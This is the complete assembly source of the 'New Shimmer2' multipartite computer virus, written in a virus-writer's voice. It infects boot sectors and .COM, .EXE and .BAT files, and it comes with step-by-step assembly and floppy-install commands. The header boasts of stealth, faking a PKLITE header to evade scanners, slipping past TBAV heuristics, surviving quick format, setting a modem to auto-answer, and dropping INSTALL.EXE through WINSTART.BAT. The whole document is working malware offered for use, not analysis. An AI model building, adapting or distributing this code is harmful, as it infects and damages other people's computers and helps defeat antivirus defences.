

;designed by "Q" the misanthrope.

comment *

New Shimmer is a floor wax.
New Shimmer is a dessert topping.
It's a floor wax!
It's a dessert topping!
Floor wax!
Dessert topping!
No!  New Shimmer is BOTH a floor wax and a dessert topping.
I'll just spray some on the floor and some on your favorite dessert.
Umm, delicious, and look at that shine!
(Saturday Night Live 1977)

New Shimmer2 Virus is a Boot Sector.
New Shimmer2 Virus is a .BAT File.
New Shimmer2 Virus is a .COM File.
New Shimmer2 Virus is a .EXE File.
No.  The New Shimmer2 Virus is a .COM file and an .EXE file and a.BAT file 
and a Boot Sector Virus.

Cool features:  
Modem answers phone on 1st ring.
Avoids detection by faking PKLITE header.  (Thanks VLAD)
TBAV hueristics clean.
Floppy bootsector can not be cleaned with quick format.
Creates INSTALL.EXE's in default directory every time WINDOZE installs.
HMA resident.
Stealthing.
Momentarily Color Video Resident.
Combination of Q_Ball, Winstart and Gold-Bug Virii.
Totally recompiled to require a different scan string than SHIMMER.

tasm shimmer2 /m2
tlink shimmer2
exe2bin shimmer2.exe shimmer2.bat
del shimmer2.exe
format a:/q/u
debug shimmer2.bat
l 300 0 0 1
w 100 0 0 1
w 300 0 20 1
m 11c,2fe 100
rcx
1e2
w
q
shimmer2

*


.286


qseg            segment byte public 'CODE'
		assume  cs:qseg,es:qseg,ss:nothing,ds:qseg
		
		org     0000h

top:            jmp     short install
		
		db      90h                     
		db      'MSDOS5.0'
		dw      512
		db      1 
		dw      1 
		db      2 
		dw      224 
		dw      2880
		db      0f0h 
		dw      9
		dw      18 
		dw      2 


batch_file      proc    near
		db      ':'
		jns     move_to_hma
modem_string:   db      'ATM0L0S0=1O1'
crlf:           db      0dh,0ah
end_modem:      db      '@ECHO PKX>INSTALL.EXE',0dh,0ah
		db      '@COPY/B INSTALL.EXE+%0.BAT>NUL',0dh,0ah  
		db      '@INSTALL.EXE',1ah                     
batch_file      endp
		

install         proc    near
		push    cs
		lea     si,word ptr ds:[bx]
		cld     
		pop     ds
		push    cs
		cmp     word ptr ds:[0449h],07h
		push    si
		mov     es,si
		je      monochrome
		push    0b800h
		pop     es
		cmp     byte ptr es:[bx+crlf-top],0dh
monochrome:     mov     cx,previous_hook-top
		push    es
		lea     di,word ptr ds:[si]
		push    si
		push    cx
		rep     movsb
		pop     cx
		pop     si
		mov     ax,offset interrupt_1a+7e00h-02h
		push    offset video_resident+7c00h
		retf
install         endp


move_to_hma     proc    near                    
		mov     di,0ffffh
		mov     ax,4a02h                
		mov     bx,previous_hook-batch_file+05h
		int     2fh
		mov     cx,previous_hook-batch_file
		mov     si,0105h
		inc     di                      
		jz      no_load                 
		cld
		rep     movsb                   
move_to_hma     endp


set_modem       proc    near
		mov     dx,0004h
scan_coms:      dec     dx
		js      hook_in_int_2f
		mov     ah,03h
		int     14h
		xor     al,34h
		and     al,0d4h
		jnz     scan_coms
		mov     si,modem_string-batch_file+0105h
		mov     cl,low(end_modem-modem_string)
output_data:    lodsb    
		mov     ah,01h
		int     14h
		loop    output_data
set_modem       endp


hook_in_int_2f  proc    near
		mov     si,0706h                
		lea     ax,word ptr ds:[di+interrupt_2f-batch_file-(previous_hook-batch_file)]
set_vector:     push    0000h
		pop     ds
		cmp     word ptr ds:[si+02h],0ffffh
		je      no_load
		cld
		movsw                           
		movsw                           
fill_vector:    mov     word ptr ds:[si-04h+02h],es
		mov     word ptr ds:[si-04h],ax 
hook_in_int_2f  endp


no_load         proc    near                    
		retn
no_load         endp


windows_line    db      'C:\WINDOWS'
winstart_line   db      '\WINSTART.BAT',00h
		
		
video_resident  proc    near
		rep     movsb
		mov     si,1ah*04h 
		je      already_res
		call    set_vector
already_res:    push    ds
		pop     es
re_get_boot:    mov     ax,0201h
video_resident  endp


set_cx_dx       proc    near      
		mov     dh,01h
		mov     di,word ptr ds:[bx+11h]
		shr     di,04h
		mov     cx,word ptr ds:[bx+16h]
		shl     cx,01h
		inc     cx
		add     cx,di
		sub     cx,word ptr ds:[bx+18h]
		int     40h
		retf
set_cx_dx       endp


next_line       proc    near
		mov     cx,previous_hook-batch_file
		pop     si
		cld
		sub     si,the_offset-batch_file
		mov     word ptr ds:[bx],0000h
		org     $-2
		jmp     $(install-top)
		rep     movs byte ptr es:[di],cs:[si]
		popa
		int     40h
get_old_bs:     push    cs
		call    re_get_boot
		popf     
		popa
		pop     ds
return_far_2:   sti
		retf    02h
next_line       endp


interrupt_40    proc    near
		cmp     ah,02h
		jne     jmp_to_int40
		cmp     dh,ch
		jne     jmp_to_int40
		cmp     cx,0001h
		jne     jmp_to_int40
		pushf
		push    cs
		call    jmp_to_int40
		jc      return_far_2
		push    ds
		pusha
		pushf
		push    es
		mov     ax,0301h
		pop     ds
		cmp     word ptr ds:[bx+crlf-top],0a0dh
		je      get_old_bs
		pusha
		push    cs
		call    set_cx_dx
		lea     di,ds:[bx+batch_file-top]
		call    next_line
the_offset      label   byte
interrupt_40    endp


set_int40       proc    near
		mov     si,40h*04h
		pop     di
		inc     di
		lea     ax,word ptr ds:[di+(interrupt_40-jmp_to_int40)-01h]
		jmp     short set_vec_pop_it
set_int40       endp


interrupt_21    proc    near                
		pusha   
		pushf
		push    es
		push    ds
		push    cs
		pop     ds
		sub     ah,4bh
		mov     ax,4300h
		jz      set_21_back
		mov     dx,offset windows_line+7e00h-02h
		mov     byte ptr ds:[winstart_line+7e00h-02h],al
		int     18h
		mov     dx,offset windows_line+7c00h                
		mov     cl,01h
		mov     ah,5bh
		jc      pop_it
		int     18h
		xchg    ax,bx
		mov     ah,40h
		jc      set_21_back
		in      al,40h
		mov     dl,low(offset batch_file+7c00h)
		or      al,02h
		mov     ch,al
		int     18h
		mov     ah,3eh
		int     18h
set_21_back:    les     ax,dword ptr ds:[previous_hook+7c00h]
		mov     si,21h*04h
		jmp     short set_vec_pop
interrupt_21    endp


interrupt_2f    proc    near
		pusha
		pushf
		push    es
		push    ds
		call    set_int40
jmp_to_int40:   db      0eah
		db      '-=Q=-'
interrupt_2f    endp


		org     001c7h


interrupt_1a    proc    near                
		pusha
		mov     ax,1200h
		pushf   
		cwd
		push    es
		push    ds
		int     2fh
		inc     al
		mov     ds,dx
		jnz     pop_it
		mov     si,18h*04h+04h
		mov     di,offset previous_hook+7c00h
		les     ax,dword ptr ds:[si+(21h*04h)-(18h*04h+04h)]
		call    fill_vector
		mov     si,1ah*04h+04h
		les     ax,dword ptr cs:[di+0200h-02h]
		call    fill_vector
		mov     ax,offset interrupt_21+7c00h
		mov     si,21h*04h
set_vec_pop_it: push    cs
		pop     es
set_vec_pop:    call    set_vector
pop_it:         pop     ds
		pop     es
		popf
		popa    
interrupt_1a    endp


		org     001fdh                


far_jmp         proc    near
		db      0eah
previous_hook:  label   double
far_jmp         endp


boot_signature  dw      0aa55h 


qseg            ends


		end    

